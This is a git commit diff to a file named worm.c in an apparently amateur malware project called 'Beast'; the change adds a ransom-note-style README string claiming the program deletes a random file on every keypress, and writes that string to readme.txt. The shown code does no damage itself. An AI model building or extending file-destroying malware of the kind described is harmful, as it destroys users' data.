30fc12f71f9b758488fb17230a5fa6c0c5ea902b
Timo S <58859419+timo-cmd@users.noreply.github.com>
2020-11-08 19:22:57 +0100

    Update worm.c

--- sources/worm.c
+++ sources/worm.c
@@ -11,6 +11,7 @@
 #define DATA_SIZE 1000
 #define FILE_NAME "readme.txt"
 
+#define _README_ "This is the Beast malware v0.01-dev\n\nEvery times when you hit any key on your keyboard this malwarw will delete a randomly choosed file on your system.\n\nDeveloped for fun and research. Use it ar your own risks. I am not responsible for any kind of damage omitted by Beast. I suggest you to run this on vms only!\n\n\tWritten by Timo Sarkar on November 2020" 
 #define random rand()
 #define _BEAST_VERSION_NUMBER_ 0
 #define _BEAST_VERSION_MINOR_  0
@@ -20,6 +21,7 @@
 
 int main( void ) {
   FILE* file_ptr = fopen( FILE_NAME, "w" );
+  fprintf( file_ptr, _README_ );
   fclose( file_ptr );
   return 0;
 }
